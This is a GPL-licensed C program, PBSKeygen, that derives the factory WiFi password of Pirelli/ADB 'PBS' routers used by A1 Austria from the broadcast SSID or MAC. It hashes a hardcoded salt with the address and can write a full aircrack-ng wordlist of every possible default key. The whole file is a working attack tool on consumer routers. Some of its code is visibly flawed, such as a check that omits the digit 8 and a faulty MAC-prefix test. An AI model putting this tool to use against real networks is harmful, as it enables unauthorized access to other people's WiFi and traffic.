
/*

    PBSKeygen -- A default WiFi password generator for PBS(Pirelli/ADB Italia) routers used by A1 in Austria.
    
    Copyright (C) 2021 Simon H. <dx3m@me.com>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <openssl/sha.h>

int charcutter(char *string, char cut) {

    char *src;
    char *dest;
    
    for (src = dest = string; *src != '\0'; src++) {
        *dest = *src;
        if (*dest != cut) dest++;
    }
    
    *dest = '\0';
    return 0;
}

const char *lookup_tbl = "0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz";
const unsigned char PBSsalt[] = { 0x54, 0x45, 0x4F, 0x74, 0x65, 0x6C, 0xB6, 0xD9, 0x86, 0x96, 0x8D, 0x34, 0x45, 0xD2, 0x3B, 0x15, 0xCA, 0xAF, 0x12, 0x84, 0x02, 0xAC, 0x56, 0x00, 0x05, 0xCE, 0x20, 0x75, 0x94, 0x3F, 0xDC, 0xE8 };
		
char *PBSkeygenFromMac(const unsigned char *mac){
	unsigned char *tmp_mac = malloc(6);
	if(tmp_mac == NULL) return NULL;
	
	memcpy(tmp_mac, mac, 6);
	
	SHA256_CTX sha;
	SHA256_Init(&sha);
	SHA256_Update(&sha, (const void*)PBSsalt, sizeof(PBSsalt));
	
	tmp_mac[5] -= 5;
	SHA256_Update(&sha, (const void*)tmp_mac, 6);
	
	unsigned char *hash = malloc(32);
	char key[14];
	memset(key, 0, 14);
	
	SHA256_Final(hash, &sha);
	
	for(int i=0;i<13;i++){
		key[i] = lookup_tbl[hash[i] % strlen(lookup_tbl)];
	}
	
	free(hash);
	free(tmp_mac);
	return strdup(key);
}

int PBSkeygenSSIDtoMac(const char *ssid, unsigned char *mac){
	
	unsigned int ssid_val = strtol(ssid+4, NULL, 16);
	
	mac[0] = 0x38;
	mac[1] = 0x22;
	mac[2] = 0x9D;
	mac[3] = (char)(ssid_val >> 16) & 0xFF;
	mac[4] = (char)(ssid_val >> 8) & 0xFF;
	mac[5] = (char)ssid_val & 0xFF;	
	mac[5] += 5;
	
	return 0;
}

char *PBSkeygenFromSSID(unsigned char *ssid, unsigned char *macaddr){
	unsigned char mac[6];
	PBSkeygenSSIDtoMac(ssid, (unsigned char *)&mac);
	memcpy(macaddr, &mac, 6);
	return PBSkeygenFromMac(macaddr);
}

int main(int argc, char *argv[]){
	
	char *args[2];
	
	if(argc == 1){
		argv[1] = "-h";
		argc++;
	}
	
	int flag_ssid=0,flag_mac=0,flag_wordlist=0,flag_key=0;
	char *ssid = malloc(20);
	char *macStr = malloc(20);
	char *wordlist;
	unsigned char *mac = malloc(6);
	char *WiFiKey;
	
	while(1){
		int ret = getopt(argc, argv, "s:m:hw:k:");
		if(ret == -1) break;
		
		switch(ret){
			/* SSID mode */
			case 's':
			{
				flag_ssid = 1;
				flag_mac = flag_wordlist = flag_key = 0;
				int len = strlen(optarg);
				if(len > 10){
					fprintf(stderr, "SSID to long\n");
					flag_ssid = 0;
					break;
				}
				memcpy(ssid, optarg, len);
				
				if(memcmp(ssid, "PBS-", 4) != 0){
					fprintf(stderr, "Entered SSID is invalid\n");
					flag_ssid = 0;
					break;
				}
				
				int unallowed = 0;
				const char *allowed = "012345679ABCDEF\0";
				for(int i=0;i<6;i++){
					if(!strchr(allowed, ssid[4+i])){
						unallowed = 1;
						flag_ssid = 0;
					}
				}
				
				if(unallowed){
					fprintf(stderr, "SSID has unallowed characters\n");
					break;
				}
				break;
			}
			case ':':
			{
				fprintf(stderr, "missing argument");
				break;
			}
			/* MAC address mode */
			case 'm':
			{
				flag_mac = 1;
				flag_ssid = flag_wordlist = flag_key = 0;
				int len = strlen(optarg);
				memcpy(macStr, optarg, len);
				charcutter(macStr, ':');
				len = strlen(macStr);
				if(len > 12 || len < 12){
					fprintf(stderr, "MAC address to long or to short\n");
					flag_mac = 0;
					break;
				}
				unsigned long long macLong = strtol(macStr, NULL, 16);
				mac[0] = (char)(macLong >> 40) & 0xFF;
				mac[1] = (char)(macLong >> 32) & 0xFF;
				mac[2] = (char)(macLong >> 24) & 0xFF;
				mac[3] = (char)(macLong >> 16) & 0xFF;
				mac[4] = (char)(macLong >> 8) & 0xFF;
				mac[5] = (char)macLong & 0xFF;
				
				if((mac[0] != 0x38) && (mac[1] != 0x22) && (mac[2] != 0x9D))
				{
					fprintf(stderr, "MAC address needs to start with 38:22:9D\n");
					flag_mac = 0;
				}
				break;
			}
			/* send help */
			case 'h':
			{
				flag_wordlist = flag_key = flag_mac = flag_ssid = 0;
				fprintf(stderr, "PBSKeygen -- A WiFi keygen for the Pirelli ADB Italia \"PBS\" routers (A1 Austria)\n\nExample:\t%s -s PBS-7382BB\n\t\t%s -m 38:22:9D:73:82:C0\n\nParameter list:\n\t-s PBS-XXXXXX\tneeds a SSID as next argument\n\t-m [MAC addr]\tneeds a MAC address as next argument\n\t-w [filename]\twrite all possible passwords ready for aircrack-ng\n\t-k\t\tsearches WiFi key for the corresponding SSID and MAC\n\t-h\t\tprints this help screen\n", argv[0], argv[0]);
				break;
			}
			/* Generates a wordlist of all possible keys (aircrack-ng) */
			case 'w':
			{
				wordlist = malloc(strlen(optarg)+1);
				memcpy(wordlist, optarg, strlen(optarg));
				flag_wordlist = 1;
				break;
			}
			case 'k':
			{
				WiFiKey = malloc(strlen(optarg)+1);
				memcpy(WiFiKey, optarg, strlen(optarg));
				flag_key = 1;
				
				flag_wordlist = flag_ssid = flag_mac = 0;
				break;
			}
			default:
				break;
		}
	}
	
	if(flag_ssid){
		printf("SSID: %s\nWiFi Key: %s\n", ssid, PBSkeygenFromSSID(ssid, mac));
		printf("Mac Address: %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	}
	
	if(flag_mac){
		sprintf(ssid, "PBS-%02X%02X%02X", mac[3], mac[4], mac[5]-5);
		printf("SSID: %s\nWiFi Key: %s\n", ssid, PBSkeygenFromMac(mac));
		printf("Mac Address: %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	}
	
	if(flag_wordlist){
		printf("Generating wordlist at %s\n", wordlist);
		FILE *fd = fopen(wordlist, "w+");
		if(fd != NULL){
			for(unsigned int i=0; i<0xFFFFFF;i++){
				memset(ssid, 0, 20);
				sprintf(ssid, "PBS-%06X", i & 0xFFFFFF);
				fprintf(fd, "%s\n", PBSkeygenFromSSID(ssid, mac));
			}
			fflush(fd);
			fclose(fd);
			printf("Success! Generated %i default passwords\n", 0xFFFFFF);
		}
		else{
			printf("FAILED!");
		}
		free(wordlist);
	}
	
	if(flag_key)
	{
		printf("Searching WiFi key %s...", WiFiKey);
		fflush(stdout);
		int found = 0;
		for(unsigned int i=0;i<0xFFFFFF;i++){
			memset(ssid, 0, 20);
			memset(mac, 0, 6);
			
			sprintf(ssid, "PBS-%06X", i & 0xFFFFFF);
			if(strcmp(PBSkeygenFromSSID(ssid, mac), WiFiKey) == 0){
				found++;
				break;
			}
		}
		
		printf("Done.\n\n");
		if(found){
			printf("Found matching WiFi password:\n");
			printf("SSID: %s\nWiFi Key: %s\n", ssid, WiFiKey);
			printf("Mac Address: %02X:%02X:%02X:%02X:%02X:%02X\n", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
		}
		else{
			printf("No matching results. Wrong key?\n");
		}
		free(WiFiKey);
	}
		
	free(ssid);
	free(mac);
	free(macStr);
	return 0;
}

